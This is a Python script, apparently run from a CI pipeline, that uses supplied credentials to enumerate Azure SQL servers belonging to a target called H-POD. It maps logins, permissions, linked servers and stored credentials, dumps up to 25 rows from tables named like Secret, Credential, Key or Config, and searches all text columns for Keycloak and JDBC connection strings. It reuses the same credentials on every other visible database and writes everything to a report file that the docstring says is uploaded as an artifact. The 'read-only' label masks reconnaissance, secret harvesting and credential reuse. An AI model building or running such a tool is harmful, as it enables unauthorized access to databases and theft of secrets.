"""Read-only Keycloak-DB discovery against H-POD Azure SQL.

Selects only. No DDL/DML/proc. Any statement not starting with SELECT/WITH is refused
locally before it reaches the server.

Payload: repo secret PAYLOAD_B64 = base64(json list of {server,database,user,password,tag}).
Output: /tmp/out/kc_enum.json (uploaded as a private-repo artifact).
"""
import base64
import json
import os
import re
import sys
import time

import pyodbc

FORBIDDEN = re.compile(
    r"\b(insert|update|delete|drop|alter|truncate|merge|grant|revoke|deny|backup|restore|"
    r"xp_cmdshell|sp_executesql|sp_configure|dbcc|kill|shutdown|reconfigure|execute|exec)\b",
    re.I,
)
SAFE_IDENT = re.compile(r"^[A-Za-z0-9_@#$][A-Za-z0-9_@#$ ]{0,120}$")
STRING_TYPES = ("char", "varchar", "nchar", "nvarchar", "text", "ntext")


def guard(sql):
    s = sql.strip()
    if not re.match(r"^(select|with)\b", s, re.I):
        raise ValueError("REFUSED non-select")
    m = FORBIDDEN.search(s)
    if m:
        raise ValueError("REFUSED token %s" % m.group(0))
    return s


def connect(srv, db, user, pwd, timeout=30):
    cs = ("DRIVER={ODBC Driver 18 for SQL Server};SERVER=tcp:%s,1433;DATABASE=%s;UID=%s;PWD=%s;"
          "Encrypt=yes;TrustServerCertificate=yes;Connection Timeout=%d;Login Timeout=%d;Pooling=no"
          % (srv, db, user, pwd, timeout, timeout))
    return pyodbc.connect(cs, timeout=timeout, autocommit=True)


def classify(err):
    m = str(err)
    if "40615" in m:
        return "FIREWALL_40615"
    if "18456" in m:
        return "LOGIN_18456"
    if "4060" in m:
        return "DB_4060"
    if "40613" in m:
        return "DB_UNAVAILABLE_40613"
    if "timeout" in m.lower() or "HYT00" in m:
        return "TIMEOUT"
    return "OTHER"


def rows_of(cur, sql):
    cur.execute(guard(sql))
    cols = [d[0] for d in cur.description]
    return [{c: (None if v is None else (v if isinstance(v, (int, float)) else str(v)))
             for c, v in zip(cols, r)} for r in cur.fetchall()]


CORE = [
    ("identity",
     "SELECT @@VERSION AS v, SERVERPROPERTY('ProductVersion') AS pv, SERVERPROPERTY('Edition') AS ed, "
     "SERVERPROPERTY('EngineEdition') AS ee, @@SERVERNAME AS srv, DB_NAME() AS db, "
     "SUSER_SNAME() AS login_name, USER_NAME() AS db_user, ORIGINAL_LOGIN() AS orig_login"),
    ("server_roles",
     "SELECT r.name AS role, IS_SRVROLEMEMBER(r.name) AS is_member FROM sys.server_principals r "
     "WHERE r.type='R' ORDER BY r.name"),
    ("server_perms",
     "SELECT class_desc, permission_name, state_desc FROM fn_my_permissions(NULL,'SERVER') ORDER BY permission_name"),
    ("db_perms",
     "SELECT class_desc, permission_name, state_desc FROM fn_my_permissions(NULL,'DATABASE') ORDER BY permission_name"),
    ("databases",
     "SELECT name, state_desc, SUSER_SNAME(owner_sid) AS owner_login, is_read_only, create_date "
     "FROM sys.databases ORDER BY name"),
    ("linked_servers",
     "SELECT name, product, provider, data_source, location, is_linked, is_remote_login_enabled, "
     "is_rpc_out_enabled FROM sys.servers"),
    ("external_data_sources",
     "SELECT name, type_desc, location, credential_id, database_name FROM sys.external_data_sources"),
    ("external_tables",
     "SELECT name, data_source_id, location, object_id FROM sys.external_tables"),
    ("db_scoped_creds",
     "SELECT name, credential_identity, create_date FROM sys.database_scoped_credentials"),
    ("sql_logins",
     "SELECT TOP 200 name, type_desc, is_disabled, default_database_name FROM sys.sql_logins ORDER BY name"),
    ("server_principals",
     "SELECT TOP 300 name, type_desc, is_disabled, default_database_name FROM sys.server_principals ORDER BY name"),
    ("service_objectives",
     "SELECT database_name, edition, service_objective, elastic_pool_name FROM sys.database_service_objectives"),
    ("synonyms",
     "SELECT TOP 100 SCHEMA_NAME(schema_id) AS sch, name, base_object_name FROM sys.synonyms"),
    ("db_principals",
     "SELECT TOP 200 name, type_desc, is_disabled, default_schema_name FROM sys.database_principals "
     "WHERE type IN ('S','U','G','E','X') ORDER BY name"),
    ("tables_by_rows",
     "SELECT TOP 400 s.name AS sch, t.name AS tbl, SUM(p.rows) AS row_count FROM sys.tables t "
     "JOIN sys.schemas s ON s.schema_id=t.schema_id JOIN sys.partitions p ON p.object_id=t.object_id "
     "AND p.index_id IN (0,1) GROUP BY s.name, t.name ORDER BY SUM(p.rows) DESC"),
    ("configish_tables",
     "SELECT TABLE_SCHEMA AS sch, TABLE_NAME AS tbl FROM INFORMATION_SCHEMA.TABLES "
     "WHERE TABLE_TYPE='BASE TABLE' AND (TABLE_NAME LIKE '%Config%' OR TABLE_NAME LIKE '%Setting%' "
     "OR TABLE_NAME LIKE '%Secret%' OR TABLE_NAME LIKE '%Credential%' OR TABLE_NAME LIKE '%Connection%' "
     "OR TABLE_NAME LIKE '%Tenant%' OR TABLE_NAME LIKE '%Identity%' OR TABLE_NAME LIKE '%Provider%' "
     "OR TABLE_NAME LIKE '%App%' OR TABLE_NAME LIKE '%Server%' OR TABLE_NAME LIKE '%Url%' "
     "OR TABLE_NAME LIKE '%Endpoint%' OR TABLE_NAME LIKE '%Key%') ORDER BY TABLE_NAME"),
    ("searchable_columns",
     "SELECT c.TABLE_SCHEMA AS sch, c.TABLE_NAME AS tbl, c.COLUMN_NAME AS col, c.DATA_TYPE AS dt "
     "FROM INFORMATION_SCHEMA.COLUMNS c JOIN INFORMATION_SCHEMA.TABLES t "
     "ON t.TABLE_SCHEMA=c.TABLE_SCHEMA AND t.TABLE_NAME=c.TABLE_NAME "
     "WHERE t.TABLE_TYPE='BASE TABLE' AND c.DATA_TYPE IN "
     "('char','varchar','nchar','nvarchar','text','ntext') ORDER BY c.TABLE_NAME, c.ORDINAL_POSITION"),
]

NEEDLES = ["keycloak", "jdbc:", "id.h-pod", "kc_db", "auth.h-pod", "openid-connect"]


def harvest(cur, sch, tbl, cap=25, wcap=300):
    if not SAFE_IDENT.match(sch) or not SAFE_IDENT.match(tbl):
        return {"error": "unsafe identifier"}
    try:
        cur.execute("SELECT COUNT(*) FROM [%s].[%s]" % (sch, tbl))
        n = cur.fetchone()[0]
    except Exception as e:
        return {"error": str(e)[:160]}
    if n == 0:
        return {"count": 0}
    try:
        cur.execute("SELECT TOP %d * FROM [%s].[%s]" % (cap, sch, tbl))
        cols = [d[0] for d in cur.description]
        recs = [{c: (None if v is None else str(v)[:wcap]) for c, v in zip(cols, r)} for r in cur.fetchall()]
        return {"count": n, "rows": recs}
    except Exception as e:
        return {"count": n, "error": str(e)[:160]}


def search_values(cur, sch, tbl, col):
    """Return a count of rows whose column value mentions a keycloak-ish needle."""
    if not (SAFE_IDENT.match(sch) and SAFE_IDENT.match(tbl) and SAFE_IDENT.match(col)):
        return None
    likes = " OR ".join("CAST([%s] AS NVARCHAR(MAX)) LIKE '%%%s%%'" % (col, n) for n in NEEDLES)
    sql = "SELECT TOP 5 * FROM [%s].[%s] WHERE %s" % (sch, tbl, likes)
    try:
        cur.execute(guard(sql))
        cols = [d[0] for d in cur.description]
        recs = [{c: (None if v is None else str(v)[:400]) for c, v in zip(cols, r)} for r in cur.fetchall()]
        return recs
    except Exception:
        return None


def try_db(cur_master, srv, db, user, pwd, res):
    rec = {"database": db}
    try:
        cn = connect(srv, db, user, pwd, timeout=20)
    except Exception as e:
        rec["status"] = classify(e)
        rec["err"] = str(e)[:200]
        return rec
    rec["status"] = "SUCCESS"
    try:
        c2 = cn.cursor()
        rec["identity"] = rows_of(c2, CORE[0][1])
        try:
            rec["kc_table_hits"] = rows_of(
                c2,
                "SELECT TABLE_SCHEMA AS sch, TABLE_NAME AS tbl FROM INFORMATION_SCHEMA.TABLES "
                "WHERE TABLE_NAME LIKE '%COMPONENT%' OR TABLE_NAME LIKE '%CLIENT%' "
                "OR TABLE_NAME LIKE '%REALM%' OR TABLE_NAME LIKE '%USER_ENTITY%' "
                "OR TABLE_NAME LIKE '%CREDENTIAL%' ORDER BY TABLE_NAME")
        except Exception as e:
            rec["kc_table_hits"] = {"error": str(e)[:160]}
    finally:
        try:
            cn.close()
        except Exception:
            pass
    return rec


def main():
    payload = json.loads(base64.b64decode(os.environ["PAYLOAD_B64"]).decode())
    os.makedirs("/tmp/out", exist_ok=True)
    report = {"generated": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()), "connections": []}

    for idx, item in enumerate(payload):
        srv, db, user = item["server"], item["database"], item["user"]
        tag = item.get("tag") or "%s|%s|%s" % (srv, db, user)
        print("=== CONN %d ===" % idx, flush=True)
        rec = {"tag": tag, "server": srv, "database": db, "user": user, "sections": {}}
        try:
            cn = connect(srv, db, user, item["password"])
        except Exception as e:
            rec["connect_status"] = classify(e)
            rec["connect_error"] = str(e)[:300]
            print("CONNFAIL %s" % rec["connect_status"], flush=True)
            report["connections"].append(rec)
            continue
        rec["connect_status"] = "SUCCESS"
        print("CONNECTED", flush=True)
        try:
            cn.timeout = 25
        except Exception:
            pass
        try:
            cur = cn.cursor()
            for name, sql in CORE:
                try:
                    data = rows_of(cur, sql)
                    rec["sections"][name] = data
                    print("OK %-22s rows=%d" % (name, len(data)), flush=True)
                except Exception as e:
                    rec["sections"][name] = {"error": str(e)[:200]}
                    print("ERR %-21s %s" % (name, str(e)[:100]), flush=True)

            # targeted value search for keycloak datasource strings
            hits = {}
            cols = rec["sections"].get("searchable_columns") or []
            if isinstance(cols, list):
                for c in cols[:400]:
                    if not isinstance(c, dict):
                        continue
                    got = search_values(cur, c.get("sch"), c.get("tbl"), c.get("col"))
                    if got:
                        hits["%s.%s.%s" % (c["sch"], c["tbl"], c["col"])] = got
                        print("HIT n=%d" % len(got), flush=True)
            rec["keycloak_string_hits"] = hits

            # bounded harvest of config-ish tables
            harvested = {}
            for t in (rec["sections"].get("configish_tables") or [])[:40]:
                if not isinstance(t, dict):
                    continue
                k = "%s.%s" % (t.get("sch"), t.get("tbl"))
                if k in harvested:
                    continue
                harvested[k] = harvest(cur, t.get("sch"), t.get("tbl"))
                print("HARVEST n=%s" % harvested[k].get("count"), flush=True)
            rec["config_harvest"] = harvested

            # connect to every visible database on this logical server with the same creds
            names = [d.get("name") for d in (rec["sections"].get("databases") or []) if isinstance(d, dict)]
            rec["db_probe"] = [try_db(cur, srv, n, user, item["password"], rec)
                               for n in names[:40] if n and n != db]
            for p in rec["db_probe"]:
                print("DBPROBE %s" % p["status"], flush=True)
        finally:
            try:
                cn.close()
            except Exception:
                pass
        report["connections"].append(rec)

    with open("/tmp/out/sql-enum.json", "w") as f:
        json.dump(report, f, indent=1)
    print("REPORT_DONE", flush=True)
    return 0


if __name__ == "__main__":
    sys.exit(main())
